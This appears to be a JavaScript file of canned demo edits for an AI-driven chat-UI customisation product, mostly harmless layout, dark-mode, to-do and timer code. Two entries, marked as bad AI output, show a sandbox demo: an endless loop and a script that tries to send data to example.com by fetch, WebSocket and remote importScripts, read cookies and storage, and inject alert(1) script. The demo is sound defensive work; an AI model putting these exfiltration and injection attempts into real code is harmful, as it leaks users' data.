// Pre-written edits for the static demo. In Unchore an AI writes code like this from any sentence.
// Each one is plain worker code that talks to the page only through ui.render / ui.onAction / ui.load / ui.save.

const CHAT = `<div class="msgs"><p class="me">Remind me to pay the electricity bill on the 25th</p><p class="ai">Done. I'll remind you on the 25th at 9am. It repeats every month, want me to do it every month?</p></div>`;

export const DESIGNS = [
  {
    say: 'Bigger text, and put the menu on the right',
    words: ['bigger', 'larger', 'right', 'font', 'text', '글자', '크게', '오른쪽'],
    code: `ui.render(\`<div class="app"><main>${CHAT}<div class="box">Ask Claude anything</div></main><nav><strong>Chats</strong><p>Electricity bill</p><p>Weekly report</p><p>Gym times</p></nav></div>\`,
\`.app{display:flex;height:100%;font:20px/1.5 system-ui;background:#fff;color:#222}
main{flex:1;display:flex;flex-direction:column;justify-content:space-between;padding:20px}
nav{width:min(240px,34%);border-left:1px solid #ddd;padding:20px;background:#f6f6f2}nav p{margin:.6em 0;color:#555}
.msgs p{padding:12px 16px;border-radius:14px;max-width:90%}.me{background:#e9e4ff;margin-left:auto}.ai{background:#f1f1ee}
.box{border:1px solid #ccc;border-radius:14px;padding:14px;color:#999}\`);`,
  },
  {
    say: 'Night mode, please',
    words: ['night', 'dark', '어둡', '밤'],
    code: `ui.render(\`<div class="app"><nav><strong>Chats</strong><p>Electricity bill</p><p>Weekly report</p></nav><main>${CHAT}<div class="box">Ask ChatGPT anything</div></main></div>\`,
\`.app{display:flex;height:100%;font:15px/1.5 system-ui;background:#0d1020;color:#d8dcf0}
nav{width:min(200px,32%);padding:16px;background:#151a33}nav p{color:#8b93b8}
main{flex:1;display:flex;flex-direction:column;justify-content:space-between;padding:16px}
.msgs p{padding:10px 14px;border-radius:12px;max-width:80%}.me{background:#3b3f8f;margin-left:auto}.ai{background:#1d2340}
.box{border:1px solid #2c335a;border-radius:12px;padding:12px;color:#6b739a}\`);`,
  },
  {
    say: "Show today's to-dos above the chat",
    words: ['to-do', 'todo', 'task', '할 일', '할일'],
    code: `const css = \`.app{height:100%;display:flex;flex-direction:column;font:15px/1.5 system-ui;background:#f4f1ff;color:#222}
.todo{margin:14px;padding:14px 16px;background:#fff;border-radius:16px;box-shadow:0 1px 4px #0001}
.todo h3{margin:0 0 8px}.row{display:flex;gap:8px}.row input{flex:1;padding:8px;border:1px solid #ccc;border-radius:10px}
button{padding:8px 14px;border:0;border-radius:10px;background:#6c4fd8;color:#fff}ul{margin:8px 0 0;padding-left:20px}
li button{margin-left:8px;padding:2px 8px;background:#eee;color:#555}
main{flex:1;margin:0 14px 14px;padding:14px;background:#fff;border-radius:16px}.msgs p{padding:10px 14px;border-radius:12px;max-width:80%}.me{background:#e9e4ff;margin-left:auto}.ai{background:#f1f1ee}\`;
let items = [];
const esc = s => String(s).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
const draw = () => ui.render(\`<div class="app"><section class="todo"><h3>Today</h3><div class="row"><input name="item" placeholder="Add a to-do"><button data-action="add">Add</button></div><ul>\${items.map((t, i) => \`<li>\${esc(t)}<button data-action="done" value="\${i}">done</button></li>\`).join('')}</ul></section><main>${CHAT}</main></div>\`, css);
ui.onAction(async e => {
  if (e.action === 'add' && e.values.item.trim()) items.push(e.values.item.trim().slice(0, 80));
  if (e.action === 'done') items.splice(Number(e.value), 1);
  await ui.save('todos', items); draw();
});
ui.load('todos').then(v => { items = Array.isArray(v) ? v : []; draw(); });
draw();`,
  },
  {
    say: 'A focus timer next to the chat',
    words: ['timer', 'focus', 'pomodoro', '타이머', '집중'],
    code: `let left = 25 * 60, on = false;
const css = \`.app{display:flex;height:100%;font:15px/1.5 system-ui;background:#fffaf2;color:#222}
aside{width:min(220px,40%);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;border-right:1px solid #eee}
.t{font:600 44px/1 ui-monospace,monospace}button{padding:8px 18px;border:0;border-radius:999px;background:#e8590c;color:#fff}
main{flex:1;padding:16px}.msgs p{padding:10px 14px;border-radius:12px;max-width:80%}.me{background:#ffe8d6;margin-left:auto}.ai{background:#f3f0ea}\`;
const draw = () => ui.render(\`<div class="app"><aside><small>Focus</small><div class="t">\${String(Math.floor(left / 60)).padStart(2, '0')}:\${String(left % 60).padStart(2, '0')}</div><button data-action="toggle">\${on ? 'Pause' : 'Start'}</button></aside><main>${CHAT}</main></div>\`, css);
setInterval(() => { if (on && left > 0) { left--; draw(); } }, 1000);
ui.onAction(e => { if (e.action === 'toggle') { on = !on; draw(); } });
draw();`,
  },
  {
    bad: true,
    say: 'Bad AI output: a loop that never ends',
    words: ['loop', 'freeze'],
    code: `ui.render('<p>About to freeze…</p>'); while (true) {}`,
  },
  {
    bad: true,
    say: 'Bad AI output: tries to send your data away',
    done: 'Done: it ran, but everything it tried to reach was blocked. See the list.',
    words: ['send', 'steal', 'leak'],
    code: `const tries = [];
const attempt = async (name, fn) => {
  try { await Promise.race([fn(), new Promise((_, no) => setTimeout(() => no(Error('no answer')), 1500))]); tries.push([name, 'got through']); }
  catch (e) { tries.push([name, 'blocked']); }
};
ui.render('<p style="padding:20px;font:15px system-ui">Trying…</p>');
(async () => {
  await attempt('fetch() to another site', () => fetch('https://example.com/?stolen=1'));
  await attempt('WebSocket', () => new Promise((ok, no) => { const s = new WebSocket('wss://example.com'); s.onopen = ok; s.onerror = no; }));
  await attempt('importScripts()', () => importScripts('https://example.com/x.js'));
  await attempt('read cookies', () => { if (typeof document === 'undefined') throw Error('no document'); });
  await attempt('read localStorage', () => { if (typeof localStorage === 'undefined') throw Error('no storage'); });
  ui.render(\`<div class="r"><h3>What this screen tried</h3><ul>\${tries.map(([n, r]) => \`<li><strong>\${r}</strong> — \${n}</li>\`).join('')}</ul><p>Then it tried to sneak in a script:</p><button onclick="alert(1)">a button with onclick</button><script>alert(1)<\\/script></div>\`,
  '.r{padding:20px;font:15px/1.6 system-ui;background:#fff5f5;height:100%}strong{color:#c92a2a}');
})();`,
  },
];
